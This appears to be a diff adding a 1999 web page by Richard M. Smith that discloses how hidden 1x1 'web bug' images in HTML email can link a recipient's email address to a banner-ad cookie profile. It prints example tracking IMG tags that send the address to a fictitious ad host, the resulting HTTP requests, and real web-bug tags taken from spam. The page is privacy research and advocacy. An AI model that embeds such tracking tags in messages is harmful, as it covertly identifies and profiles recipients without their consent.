@@ -1,0 +1,206 @@
+<BASE HREF="http://www.tiac.net/users/smiths/privacy/">
+<html>
+<head>
+<title>The Cookie Leak Security Hole in HTML Email messages</title>
+<h3>The Cookie Leak Security Hole in HTML Email messages</h3>
+<hr>
+</head>
+<body>
+
+<script src=../utils/common.js></script>
+
+<BR><B><A href=../index.htm target=_top>Web Programming</A> > <A href=index.htm target=_top>Internet Privacy</A> > Email Cookie Leak Security Hole</B><BR><BR>
+
+<BR>
+
+Richard M. Smith (<A href=mailto:smiths@tiac.net?subject=Cookie+Leak>smiths@tiac.net</A>)<BR>
+November 30, 1999
+
+<BR><BR>
+Since the invention of Web browser cookies by Netscape, the claim
+has always been made that they are anonymous and cannot be
+associated with any personal information unless someone provides
+this information.
+<P>
+In this write-up, I will present a technique in which browser
+cookies can be matched to Email addresses without people's knowledge.
+The technique relies on a security hole that is present in
+both Microsoft's Internet Explorer browser and Netscape's Navigator browser.
+This technique can be used, for example, to allow a banner ad company
+to associate an Email address with a "anonymous" profile that has been
+created for a person as they surf the Web.  Once a banner
+ad company has an Email address tied to a profile, they can
+provide a service to advertisers of customized ads
+in "junk" Email message.  These ads can be based on profiles
+previously created from Web site visits.  In addition,
+banner ad companies can offer the service of sending
+out "junk" Email messages to people who visit a particular
+Web site.  This last service makes Web surfing much less
+private.
+<P>
+First off, the syncing of an cookie to an Email address must
+be done in an Email message.  It addition, it requires the
+message to be formatted as an HTML message and therefore
+the person receiving the message must be using an HTML-enabled
+Email reader.  Most of the standard Email readers in use today,
+such as Outlook, Outlook Express, Netscape Messenger, and
+Eudora are HTML-enabled.  Also, Web-based Email
+systems such as Hotmail and Yahoo Mail are HTML-enabled.
+<P>
+The basic technique is for an HTML message to include
+a graphics in an HTML Email message that is loaded from
+a Web server belonging to a banner ad company.  This graphics
+is specified using a standard HTML IMG tag.  For example,
+this IMG tag will fetch a graphics named "SYNC.GIF" from
+a Web server belonging to MyBannerAds.com (a fictitious
+company):
+<PRE>   <img src="http://www.mybannerads.com/sync.gif>
+</PRE>
+The tag can appear anywhere on the page, and the graphics
+file, SYNC.GIF, will be fetched and displayed when the
+Email address is read.
+<P>
+In addition, if cookies are enabled in the Web browser
+and a cookie is present on the computer for
+mybannerads.com, the cookie will be sent to the
+www.mybannerads.com server with the HTTP GET
+request for the SYNC.GIF file.  This is a bit
+surprising because most people assume that only
+Web pages can use cookies.  However, because
+Web browsers are used to display HTML Email messages,
+cookies are also sent when Email messages are
+read.  This represents a serious security hole
+in my opinion.
+<P>
+So we have the graphics sending in the cookie
+to mybannerads.com, but how do we the Email
+address?  The answer is actually very simple.
+The query string of the URL for the SYNC.GIF
+file can contain the Email address as a parameter:
+For example:
+<PRE>   <img src="http://www.mybannerads.com/sync.gif?email=john@doe.com>  
+</PRE>
+The key thing here is that the company sending
+out the Email message knows your Email address.
+They have to in order to send out the message.
+In addition, it is easy for them to create custom
+mail messages for each person that they send
+mail to.
+<P>
+The final HTTP GET request then to fetch SYNC.GIF
+will look something like the following in Outlook:
+<PRE>GET /sync.gif?email=john@doe.com HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)
+Host: www.mybannerads.com
+Connection: Keep-Alive
+Cookie: id=943977050
+</PRE>
+In Netscape Messenger, the GET request looks like:
+<PRE>GET /sync.gif?email=john@doe.com HTTP/1.0
+Connection: Keep-Alive
+User-Agent: Mozilla/4.7 [en] (Win98; I)
+Host: www.mybannerads.com
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png
+Accept-Encoding: gzip
+Accept-Language: en
+Accept-Charset: iso-8859-1,*,utf-8
+Cookie: id=c643640a
+</PRE>
+Both the Email address and cookie value is included
+in the Outlook and Messenger GET requests.
+<P>
+When the GET request is processed by the MyBannerAds
+server.  It first extracts the customer id number from
+the cookie and looks it up its database of "anonymous"
+profiles of Web surfers.  Once it has located the
+profile, it then extracts the Email address from the
+URL query string, turning a once "anonymous"
+profile into an "identified" profile.
+<P>
+So where does MyBannerAds get the Email addresses in
+first place to send out a message which includes
+the SYNC.GIF file?  The answer is quite simple,
+they "rent" the Email addresses.  Or more specifically,
+the rent space in junk Email messages that are already
+being sent out.  The IMG tags typically take less
+than 100 bytes, so they can easily be embedded
+in messages that are part of any Email ad campaign
+that is using HTML Email messages.
+<P>
+Another interesting question is what do users see
+on the screen for the SYNC.GIF file.  The answer
+is nothing.  The GIF file can be a 1-by-1 image
+that is completely invisible.  The technique of including
+invisible images in junk Email messages is already
+quite common today and they are used for the
+purpose of checking to see if a junk Email has been read
+or not.
+<P>
+I've nicknamed these 1-by-1 GIFs "Web Bugs".  They
+are also known as "clear GIFs" and "invisible pixels".  More information
+about Web Bugs can be found at:
+<PRE>   <A href=http://www.tiac.net/users/smiths/privacy/wbfaq.htm>http://www.tiac.net/users/smiths/privacy/wbfaq.htm</A>
+</PRE>
+Here is some examples of Web Bugs, that I've received
+in junk Email messages over the last few months:
+<PRE>   <img src="http://www.m0.net/m/logopen02.asp?
+   vid=3&catid=370153037&email=SMITHS%40tiac.net" alt=" ">
+
+   <!-- IBOM Tag -->
+   <img SRC="http://bcaudit01.lodo.exactis.com/ibom.cgi?eid=677528&i=152565" WIDTH=1 HEIGHT=1>
+   <!-- IBOM Tag End --->
+
+   <img src="http://rsvp.rsvp0.net/servlet/footer/opened?
+   &05zDAWEktlFioHksHiDJhtEa">
+   (Email address is encrypted)
+</PRE>
+You will notice that these Web Bugs look very similar
+to the IMG tag for the SYNC.GIF file used for
+syncing a cookie to an Email address.  The only difference
+being that the Web Bugs being used today go back to the Email
+servicing company that sent out the Email message and not to a
+banner ad company.  This means that the Email servicing companies
+already have the technology in place to send out GIF images
+to sync up cookies and Email addresses.  The only change
+required is to generate a different server name in the
+Web Bug URLs.
+<P>
+To sync up as many profiles as possible, a banner ad company
+would have to rent out space on many different mailing list.
+Many millions of messages would have to sent out for them
+to learn the Email addresses of a useful percentage of
+their profile database.  However, given that the overhead
+of the GIF file tags is very low, it wouldn't be too
+difficult to rent space in many different Email lists.
+<P>
+This technique also becomes extremely easy if a banner ad
+company is sending out the Email messages themselves because
+they've entered into the Email servicing business
+or have acquired a servicing company.
+<P>
+In summary, the key point to look out for here is the
+technical progress in the banner ad business.  If banner
+ad companies enter the Email servicing business they'll
+be putting themselves in a very good position to also
+know the identity of people who are surfing to Web sites.
+Using the technique I've outlined in this write-up, the
+Email servicing side of the business can easily provide Email
+addresses to the banner ad side of the business.
+<P>
+This "progress" represents yet another step in the erosion of
+privacy on the Internet.  The best solution to this problem,
+I believe, is a technical one.  That is, Microsoft and Netscape
+should fix the security holes in their respective Web browser
+products that allow cookies to be sent out from HTML Email
+messages.
+<BR><BR>
+<H3>References</H3>
+<UL>
+<LI><A href=http://www.usatoday.com/life/cyber/tech/ctg802.htm>How anonymous is the Web?</A> USA Today, Dec. 2, 1999
+<LI><A href=wbfaq.htm>The Web Bug FAQ</A>
+</UL>
+</HTML>
+</BODY>
